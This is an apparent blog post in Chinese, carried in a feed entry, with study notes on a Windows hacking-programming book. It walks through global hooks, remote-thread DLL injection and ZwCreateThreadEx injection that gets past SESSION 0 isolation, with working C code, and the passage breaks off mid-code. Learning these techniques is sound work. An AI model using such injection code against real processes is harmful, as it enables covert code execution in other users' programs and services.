    <link href="https://ghostasky.github.io/2022/10/10/2022-9-WinCode1/"/>
    <id>https://ghostasky.github.io/2022/10/10/2022-9-WinCode1/</id>
    <published>2022-10-09T16:00:00.000Z</published>
    <updated>2022-10-11T15:42:42.172Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>准备开个系列，就叫“Windows Program Learn”，记录《Windows黑客编程技术详解》书的代码和笔记。</p><blockquote><p>https://github.com/jash-git/Windows-Hack-Programming-backup</p></blockquote><h1 id="基础">基础</h1><p>最开始是环境的搭建，这里就不搞了，好像也没啥。</p><h2 id="单一实例">单一实例</h2><p>也就是实现进程互斥。</p><h3 id="createmutexa">CreateMutexA</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateMutexA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bInitialOwner,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR                lpName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><p><code>lpMutexAttributes</code>：指向 <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)">SECURITY_ATTRIBUTES</a>结构的指针。如果此参数为<code>NULL</code>，则句柄不能被子进程继承。</p><p>结构的<strong>lpSecurityDescriptor</strong>成员指定新互斥体的安全描述符。如果<code>lpMutexAttributes</code>为<code>NULL</code>，则互斥锁将获得默认的安全描述符。</p></li><li><p><code>bInitialOwner</code>：如果此值为<strong>TRUE</strong>并且调用者创建了互斥锁，则调用线程将获得互斥锁对象的初始所有权。否则，调用线程不会获得互斥锁的所有权。</p></li><li><p><code>lpName</code>：互斥对象的名称。</p></li></ul><p>返回值：</p><ul><li>如果函数成功，则返回值是新创建的互斥对象的句柄。</li><li>如果函数失败，则返回值为<strong>NULL</strong>。</li><li>如果互斥锁是一个命名互斥锁并且该对象在此函数调用之前存在，则返回值是现有对象的句柄，并且<a href="https://learn.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>函数返回<code>ERROR_ALREADY_EXISTS</code>。</li></ul><blockquote><p>进程、线程、文件、互斥体、事件等等在内核都有一个对应的结构体，这些结构体都由内核负责管理，所以我们都可以称之为内核对象。</p><p>只有进程才会有句柄表，并且<strong>每一个进程都会有一个句柄表</strong>。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">IsAlreadyRun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hMutex = <span class="literal">NULL</span>;</span><br><span class="line">    hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, TEXT(<span class="string">&quot;TEST&quot;</span>));<span class="comment">//TEST需要唯一</span></span><br><span class="line">    <span class="keyword">if</span> (hMutex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ERROR_ALREADY_EXISTS == ::GetLastError())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="注入">注入</h1><p>内容</p><ul><li>全局钩子</li><li>远程线程钩子</li><li>突破SESSION 0隔离的远程线程注入</li><li>APC注入</li></ul><h2 id="全局钩子">全局钩子</h2><blockquote><p>ok，这里搞了两天终于搞通了，搞个虚拟机在里面写吧，，差点给电脑干出问题。。。</p></blockquote><p>Windows系统中，大部分的应用程序都是基于消息机制的，它们都有一个消息过程函数，根据不同的消息完成不同的功能。</p><p>Windows操作系统提供的钩子机制就是用来截获和监控系统中这些消息的。</p><p>按照钩子作用的范围不同，它们分为局部钩子和全局钩子。</p><ul><li>局部钩子： 针对某个线程的</li><li>全部钩子： 针对整个系统基于消息的应用，需要使用DLL文件，在DLL中实现相应的钩子函数</li></ul><h3 id="api">API</h3><h4 id="setwindowshookexa">SetWindowsHookExA</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="keyword">int</span> idHook,      <span class="comment">//要安装的钩子程序的类型，具体见官方文档</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HOOKPROC lpfn,   <span class="comment">//指向挂钩过程的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HINSTANCE hmod,  <span class="comment">//包含lpfn参数指向的钩子过程的 DLL 句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] DWORD dwThreadId <span class="comment">//与挂钩过程关联的线程的标识符。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：</p><ul><li>成功，则返回值是钩子过程的句柄。</li><li>失败，则返回值为<strong>NULL</strong></li></ul><h3 id="实现">实现</h3><p>全局钩子的话那钩子函数就必须在DLL中，这样才能“全局”，懂吧？</p><p>在操作系统中安装全局钩子后，只要进程接收到可以发出钩子的消息，全局钩子的DLL文件就会由操作系统自动或强行地加载到该进程中。创建一个全局钩子后，在对应事件发生时，系统就会把DLL加载到发生事件的进程中，从而实现DLL注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 钩子回调函数</span></span><br><span class="line"><span class="function">LRESULT MYWINDAPIEXPORT <span class="title">GetMsgProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> code,</span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Messagebox(<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> ::CallNextHookEx(g_hHook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置全局钩子</span></span><br><span class="line"><span class="function">BOOL MYWINDAPIEXPORT <span class="title">SetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">g_hHook = ::SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, GetModuleHandle(TEXT(<span class="string">&quot;MyDLL.dll&quot;</span>)) , <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook %d\n&quot;</span>,(<span class="keyword">int</span>&amp;)g_hHook);</span><br><span class="line"><span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> MYWINDAPIEXPORT <span class="title">UnsetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook %d\n&quot;</span>, (<span class="keyword">int</span>&amp;)g_hHook);</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如何将钩子句柄传递给其他进程？ 可以在DLL中创建共享内存。共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，相当 于多个进程共享一个内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HMODULE g_hDllModule;</span><br><span class="line"><span class="comment">// 共享内存</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;mydata&quot;</span>)</span></span><br><span class="line">    HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)<span class="comment">//设置可读可写可共享</span></span></span><br></pre></td></tr></table></figure><p>成功装载hook：</p><figure><img src="/2022/10/10/2022-9-WinCode1/image-20220923221139302.png" alt="image-20220923221139302"><figcaption aria-hidden="true">image-20220923221139302</figcaption></figure><h2 id="远程线程注入dll">远程线程注入DLL</h2><p>就是在另一个进程中创建线程。</p><h3 id="api-1">API</h3><h4 id="openprocess">OpenProcess</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwDesiredAccess,<span class="comment">//对进程对象的访问</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] BOOL  bInheritHandle,<span class="comment">//如果该值为 TRUE，则由该进程创建的进程将继承句柄。否则，进程不会继承此句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwProcessId<span class="comment">//要打开的本地进程的标识符</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：</p><ul><li>如果函数成功，则返回值是指定进程的打开句柄。</li><li>如果函数失败，则返回值为 NULL。要获取扩展的错误信息，请调用 <a href="https://learn.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</li></ul><h4 id="virtualallocex">VirtualAllocEx</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE hProcess,<span class="comment">//进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPVOID lpAddress,<span class="comment">//为要分配的页面区域指定所需起始地址的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flAllocationType,<span class="comment">//内存分配的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flProtect<span class="comment">//要分配的页面区域的内存保护</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值</p><ul><li>如果函数成功，则返回值是分配的页面区域的基地址。</li><li>如果函数失败，则返回值为<strong>NULL</strong>。要获取扩展的错误信息，请调用<a href="https://learn.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a></li></ul><h4 id="writeprocessmemory">WriteProcessMemory</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  hProcess,<span class="comment">//要修改的进程内存的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID  lpBaseAddress,<span class="comment">//指向要写入数据的指定进程中的基地址的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPCVOID lpBuffer,<span class="comment">//指向缓冲区的指针,要写入的数据</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] SIZE_T  *lpNumberOfBytesWritten<span class="comment">//可选，指向变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：</p><ul><li>如果函数成功，则返回值非零。</li><li>如果函数失败，则返回值为 0（零）。</li></ul><h4 id="createremotethread">CreateRemoteThread</h4><p>在另一个进程创建线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE                 hProcess,<span class="comment">//进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,<span class="comment">//指向 SECURITY_ATTRIBUTES结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T                 dwStackSize,<span class="comment">//堆栈的初始大小，以字节为单位</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//指向要由线程执行的LPTHREAD_START_ROUTINE 类型的应用程序定义函数的指针，表示远程进程中线程的起始地址。该函数必须存在于远程进程中。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID                 lpParameter,<span class="comment">//指向要传递给线程函数的变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD                  dwCreationFlags,<span class="comment">//控制线程创建的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD                lpThreadId<span class="comment">//指向接收线程标识符的变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：</p><ul><li>如果函数成功，则返回值是新线程的句柄。</li><li>如果函数失败，则返回值为<strong>NULL</strong>。</li></ul><h3 id="实现-1">实现</h3><p>使用<code>LoadLibrary</code>加载DLL，使用<code>VirtualAllocEx</code>在目标进程创建空间，使用<code>WriteProcessMemory</code>将指定的DLL路径写到指定进程空间，使用<code>CreateRemoteThread</code>在目标进程创建线程，完成线程注入DLL</p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>GetProcAddress</li><li>CreateRemoteThread</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreaeteRemoteThreadInjectDLL</span><span class="params">(DWORD dwprocessId,<span class="keyword">char</span>* pszDLLFilename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">LPVOID pDLLAddr = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//PROCESS_ALL_ACCESS: 进程对象的所有可能访问权限</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwprocessId);</span><br><span class="line"><span class="keyword">if</span> (!hProcess)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">dwSize = <span class="number">1</span> + <span class="built_in">strlen</span>(pszDLLFilename);</span><br><span class="line"><span class="comment">//MEM_COMMIT: 为指定的保留内存页面分配内存，初始化为0</span></span><br><span class="line">pDLLAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!pDLLAddr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess,pDLLAddr,pszDLLFilename,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pFuncProcAddr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDLLAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">mian():</span><br><span class="line">BOOL res = CreaeteRemoteThreadInjectDLL(<span class="number">18556</span>, (<span class="keyword">char</span>*)<span class="string">&quot;E:\\B\\win32Code\\Chapter3\\Project4\\x64\\Debug\\CreateRemoteThreadDLL.dll&quot;</span>);</span><br></pre></td></tr></table></figure><p>成功远程线程注入：</p><p><img src="/2022/10/10/2022-9-WinCode1/image-20221010221215587.png"></p><h2 id="突破session-0隔离的远线程注入">突破SESSION 0隔离的远线程注入</h2><p>如果上面的远线程注入对于系统的一些服务注入的话会失败，这是由于系统存在SESSION 0隔离的安全机制。</p><p>可以使用<code>ZwCreateThreadEx</code>进行远线程注入，还可以突破SESSION0隔离。</p><p>简单看下SESSION0隔离：<a href="https://learn.microsoft.com/zh-cn/previous-versions/ee663077(v=msdn.10)?redirectedfrom=MSDN">SESSION0隔离</a>，<a href="https://learn.microsoft.com/zh-cn/previous-versions/msdn10/Ee791007(v=MSDN.10)">SESSION0隔离</a></p><p>Windows Vista之前：</p><figure><img src="/2022/10/10/2022-9-WinCode1/ee791007.image2(zh-cn,msdn.10).png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>之后：</p><figure><img src="/2022/10/10/2022-9-WinCode1/ee791007.image3(zh-cn,msdn.10).png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h3 id="api-2">API</h3><h4 id="zwcreatethreadex">ZwCreateThreadEx</h4><p>其实这个不应该放到API这个标题下面的，因为微软其实并没有给出文档，在ntdll.dll中并没有声明，需要GetProcAddress导出。</p><p>其实<code>CreateRemoteThread</code>最终底层调用的就是<code>ZwCreateThreadEx</code>，在内核6.0后引入会话隔离机制。他在创建一个进城后不立即执行，而是挂起，也就是第七个参数<code>CreateSuspended</code>为1，从而导致DLL注入失败。（所以说置0就行了。</p><p>函数声明（注意32位与64位的声明是有区别的）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI *typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI *typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="实现-2">实现</h3><p>跟上面的差不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">ZwCreateThreadExInjectDLL</span><span class="params">(DWORD dwProcssId, <span class="keyword">char</span>* pszDLLFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">LPVOID pDLLAddr = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hNtdll = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//PROCESS_ALL_ACCESS: 进程对象的所有可能访问权限</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcssId);</span><br><span class="line"><span class="keyword">if</span> (!hProcess)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">dwSize = <span class="number">1</span> + <span class="built_in">strlen</span>(pszDLLFileName);</span><br><span class="line"><span class="comment">//MEM_COMMIT: 为指定的保留内存页面分配内存，初始化为0</span></span><br><span class="line">pDLLAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!pDLLAddr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess, pDLLAddr, pszDLLFileName, dwSize, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">hNtdll = LoadLibrary(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pFuncProcAddr)</span><br><span 